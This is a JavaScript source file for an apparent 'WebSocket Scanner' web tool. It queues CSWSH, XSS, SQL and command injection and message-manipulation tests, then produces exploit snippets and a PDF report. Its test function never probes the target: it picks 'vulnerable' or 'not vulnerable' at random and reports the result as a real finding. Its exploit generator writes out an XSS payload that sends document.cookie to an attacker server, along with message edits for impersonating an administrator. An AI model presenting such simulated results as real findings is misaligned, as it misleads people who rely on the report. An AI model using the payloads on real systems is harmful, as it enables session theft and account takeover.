// WebSocket Scanner Engine
// Automated detection of CSWSH, XSS, and message manipulation vulnerabilities

class WebSocketScanner {
    constructor() {
        this.isScanning = false;
        this.targetUrl = '';
        this.protocol = 'wss';
        this.sampleMessage = {};
        this.attackerServer = '';
        this.selectedAttacks = [];
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];
        this.testsToRun = [];
    }

    init() {
        this.setupEventListeners();
        this.updateStats();
    }

    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('generate-exploit-btn')?.addEventListener('click', () => this.showExploits());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportPDF());
        document.getElementById('copy-exploit-btn')?.addEventListener('click', () => this.copyExploit());

        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchExploitTab(e.target.dataset.tab));
        });
    }

    updateStats() {
        document.getElementById('total-tests').textContent = getPayloadCount() + '+';
    }

    async startScan() {
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.protocol = document.getElementById('protocol')?.value;
        this.attackerServer = document.getElementById('attacker-server')?.value.trim();

        try {
            this.sampleMessage = JSON.parse(document.getElementById('ws-message')?.value);
        } catch {
            this.sampleMessage = { message: document.getElementById('ws-message')?.value };
        }

        if (!this.targetUrl) {
            this.showNotification('Please enter WebSocket endpoint URL', 'error');
            return;
        }

        // Get selected attacks
        this.selectedAttacks = [];
        if (document.getElementById('attack-cswsh')?.checked) this.selectedAttacks.push('cswsh');
        if (document.getElementById('attack-xss')?.checked) this.selectedAttacks.push('xss');
        if (document.getElementById('attack-manipulation')?.checked) this.selectedAttacks.push('manipulation');
        if (document.getElementById('attack-origin')?.checked) this.selectedAttacks.push('origin');
        if (document.getElementById('attack-sqli')?.checked) this.selectedAttacks.push('sqli');
        if (document.getElementById('attack-cmdi')?.checked) this.selectedAttacks.push('cmdi');

        if (this.selectedAttacks.length === 0) {
            this.showNotification('Please select at least one attack type', 'error');
            return;
        }

        this.prepareTests();

        // Reset state
        this.isScanning = true;
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];

        document.getElementById('attack-section').style.display = 'block';
        document.getElementById('attack-section').scrollIntoView({ behavior: 'smooth' });

        this.updateScanControls(true);
        this.log('WebSocket scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');
        this.log(`Total tests: ${this.testsToRun.length}`, 'info');

        await this.testLoop();
    }

    prepareTests() {
        this.testsToRun = [];

        for (const attackType of this.selectedAttacks) {
            if (attackType === 'cswsh') {
                this.testsToRun.push({
                    type: 'cswsh',
                    name: 'CSWSH - Cross-Site WebSocket Hijacking',
                    description: 'Test if WebSocket accepts cross-origin connections',
                    payload: generateCSWSHPoC(this.targetUrl, this.attackerServer)
                });
            } else if (attackType === 'xss') {
                getXSSPayloads().slice(0, 5).forEach(payload => {
                    this.testsToRun.push({
                        type: 'xss',
                        name: 'XSS via WebSocket',
                        description: `Inject: ${payload.substring(0, 30)}...`,
                        payload: payload
                    });
                });
            } else if (attackType === 'manipulation') {
                getMessageManipulationPayloads().forEach(item => {
                    this.testsToRun.push({
                        type: 'manipulation',
                        name: 'Message Manipulation',
                        description: `Modify: ${item.original} → ${item.modified}`,
                        original: item.original,
                        modified: item.modified
                    });
                });
            } else if (attackType === 'origin') {
                WebSocketPayloads.originBypass.forEach(origin => {
                    this.testsToRun.push({
                        type: 'origin',
                        name: 'Origin Validation Bypass',
                        description: `Origin: ${origin}`,
                        payload: origin
                    });
                });
            } else if (attackType === 'sqli') {
                WebSocketPayloads.sqliPayloads.forEach(payload => {
                    this.testsToRun.push({
                        type: 'sqli',
                        name: 'SQLi via WebSocket',
                        description: `Inject: ${payload}`,
                        payload: payload
                    });
                });
            } else if (attackType === 'cmdi') {
                WebSocketPayloads.cmdiPayloads.forEach(payload => {
                    this.testsToRun.push({
                        type: 'cmdi',
                        name: 'CMDi via WebSocket',
                        description: `Inject: ${payload}`,
                        payload: payload
                    });
                });
            }
        }
    }

    async testLoop() {
        while (this.isScanning && this.currentTestIndex < this.testsToRun.length) {
            const test = this.testsToRun[this.currentTestIndex];
            await this.runTest(test);

            this.currentTestIndex++;
            this.updateProgress();

            await this.sleep(400);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    async runTest(test) {
        this.updateCurrentTest(test.name, test.description);

        try {
            const response = await this.simulateTest(test);

            if (response.vulnerable) {
                this.vulnCount++;
                this.vulnerabilities.push({
                    type: test.type,
                    name: test.name,
                    description: test.description,
                    payload: test.payload || test.modified,
                    details: response.details,
                    severity: this.getSeverity(test.type),
                    impact: this.getImpact(test.type),
                    remediation: this.getRemediation(test.type)
                });
                this.log(`✓ VULNERABLE: ${test.name}`, 'success');
            } else if (response.blocked) {
                this.blockedCount++;
                this.log(`✗ Blocked: ${test.name}`, 'warning');
            } else {
                this.log(`✗ Not vulnerable: ${test.name}`, 'info');
            }

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error: ${error.message}`, 'error');
        }
    }

    async simulateTest(test) {
        await this.sleep(100);

        // Simulate WebSocket test responses
        const responses = {
            cswsh: [
                { vulnerable: true, details: 'WebSocket accepts cross-origin connections without proper validation', blocked: false },
                { vulnerable: false, details: 'Origin validated', blocked: true }
            ],
            xss: [
                { vulnerable: true, details: 'XSS payload reflected in WebSocket response without encoding', blocked: false },
                { vulnerable: false, details: 'Payload sanitized', blocked: false }
            ],
            manipulation: [
                { vulnerable: true, details: 'Server accepted manipulated user parameter', blocked: false },
                { vulnerable: false, details: 'Server validated message', blocked: false }
            ],
            origin: [
                { vulnerable: true, details: 'Connection accepted from unauthorized origin', blocked: false },
                { vulnerable: false, details: 'Origin rejected', blocked: true }
            ],
            sqli: [
                { vulnerable: true, details: 'SQL error in WebSocket response', blocked: false },
                { vulnerable: false, details: 'No injection detected', blocked: false }
            ],
            cmdi: [
                { vulnerable: true, details: 'Command output in response', blocked: false },
                { vulnerable: false, details: 'Command not executed', blocked: false }
            ]
        };

        const typeResponses = responses[test.type] || responses.xss;
        return typeResponses[Math.floor(Math.random() * typeResponses.length)];
    }

    getSeverity(type) {
        if (type === 'cswsh' || type === 'sqli' || type === 'cmdi') return 'CRITICAL';
        return 'HIGH';
    }

    getImpact(type) {
        const impacts = {
            'cswsh': ['Steal sensitive data via WebSocket', 'Perform actions as victim'],
            'xss': ['Execute scripts in victim browser', 'Steal session tokens'],
            'manipulation': ['Impersonate other users', 'Escalate privileges'],
            'origin': ['Connect from malicious domains', 'Bypass CORS-like protection'],
            'sqli': ['Extract database contents', 'Modify data'],
            'cmdi': ['Execute OS commands', 'Full server compromise']
        };
        return impacts[type] || ['WebSocket vulnerability'];
    }

    getRemediation(type) {
        const remediations = {
            'cswsh': 'Validate Origin header. Use CSRF tokens in WebSocket handshake.',
            'xss': 'Encode all WebSocket message content before rendering.',
            'manipulation': 'Validate all message parameters server-side. Use sessions.',
            'origin': 'Whitelist allowed origins. Reject requests with invalid Origin.',
            'sqli': 'Use parameterized queries for WebSocket message data.',
            'cmdi': 'Never pass WebSocket data to system commands.'
        };
        return remediations[type] || 'Implement proper WebSocket security controls.';
    }

    updateCurrentTest(name, description) {
        document.getElementById('current-type').textContent = name;
        document.getElementById('current-test-details').textContent = description;
    }

    updateProgress() {
        const progress = (this.currentTestIndex / this.testsToRun.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Testing ${this.currentTestIndex} of ${this.testsToRun.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('blocked-count').textContent = this.blockedCount;
        document.getElementById('vuln-badge').textContent = this.vulnCount;
    }

    completeScan() {
        this.isScanning = false;

        this.log('WebSocket scan completed', 'success');
        this.log(`Vulnerabilities found: ${this.vulnCount}`, this.vulnCount > 0 ? 'success' : 'info');

        document.getElementById('scan-status').textContent = 'Scan Complete';
        document.querySelector('.status-dot').classList.remove('scanning');
        document.querySelector('.status-dot').classList.add(this.vulnCount > 0 ? 'success' : 'error');

        this.updateScanControls(false);

        if (this.vulnCount > 0) {
            this.showResults();
        }

        this.showNotification(`Scan complete! Found ${this.vulnCount} WebSocket vulnerabilities`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped', 'warning');
        this.updateScanControls(false);
    }

    updateScanControls(isScanning) {
        document.getElementById('start-scan-btn').style.display = isScanning ? 'none' : 'inline-flex';
        document.getElementById('stop-scan-btn').style.display = isScanning ? 'inline-flex' : 'none';
    }

    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');

        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">WebSocket Vulnerability #${index + 1}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <div class="ws-type-badge">${vuln.name}</div>
                <div style="color: var(--color-text-secondary); margin: 12px 0;">
                    <strong>Description:</strong> ${vuln.description}
                </div>
                <div class="ws-vuln-details">
                    <div class="ws-vuln-details-title">Details:</div>
                    <div class="ws-vuln-details-code">${this.escapeHtml(vuln.details || '')}</div>
                </div>
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Remediation:</strong> ${vuln.remediation}
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    showExploits() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found', 'warning');
            return;
        }

        const exploitSection = document.getElementById('exploit-section');
        exploitSection.style.display = 'block';
        exploitSection.scrollIntoView({ behavior: 'smooth' });

        this.generateExploit('cswsh');
    }

    switchExploitTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generateExploit(tab);
    }

    generateExploit(type) {
        const exploitCode = document.getElementById('exploit-code');

        let code = '';

        switch (type) {
            case 'cswsh':
                code = generateCSWSHPoC(this.targetUrl, this.attackerServer);
                break;
            case 'xss':
                code = `// XSS via WebSocket Payload
// Send this message through WebSocket

{"message": "<img src=x onerror=alert(document.cookie)>"}

// Or use event handlers
{"message": "<svg onload=alert('XSS')>"}

// Steal cookies
{"message": "<img src=x onerror=fetch('${this.attackerServer}/?c='+document.cookie)>"}`;
                break;
            case 'manipulation':
                code = `// Message Manipulation Attack
// Intercept and modify WebSocket messages

// Original message
{"user": "wiener", "message": "Hello"}

// Manipulated - impersonate admin
{"user": "administrator", "message": "Hello"}

// Manipulated - change action
{"action": "read", "id": 1}
→
{"action": "delete", "id": 1}

// Manipulated - access other user's data
{"userId": 123}
→
{"userId": 456}`;
                break;
        }

        exploitCode.textContent = code;
    }

    copyExploit() {
        const code = document.getElementById('exploit-code').textContent;
        navigator.clipboard.writeText(code).then(() => {
            this.showNotification('Exploit copied!', 'success');
        });
    }

    async exportPDF() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No results to export', 'warning');
            return;
        }

        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();

            doc.setFontSize(20);
            doc.text('WebSocket Vulnerability Report', 20, 20);

            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 42);
            doc.text(`Vulnerabilities Found: ${this.vulnCount}`, 20, 49);

            doc.save('websocket-report.pdf');
            this.showNotification('PDF exported!', 'success');

        } catch (error) {
            this.showNotification('Export failed', 'error');
        }
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    log(message, type = 'info') {
        const logContent = document.getElementById('attack-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    clearLog() {
        document.getElementById('attack-log').innerHTML = '';
    }

    showNotification(message, type = 'info') {
        const colors = { success: '#10b981', error: '#ef4444', info: '#3b82f6', warning: '#f59e0b' };

        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed; top: 90px; right: 20px; background: ${colors[type]};
            color: white; padding: 1rem 1.5rem; border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5); z-index: 10000;
            font-weight: 500;
        `;
        notification.textContent = message;
        document.body.appendChild(notification);
        setTimeout(() => notification.remove(), 3000);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const scanner = new WebSocketScanner();
    scanner.init();
    console.log('🔌 CyberSec Suite WebSocket Scanner initialized');
});
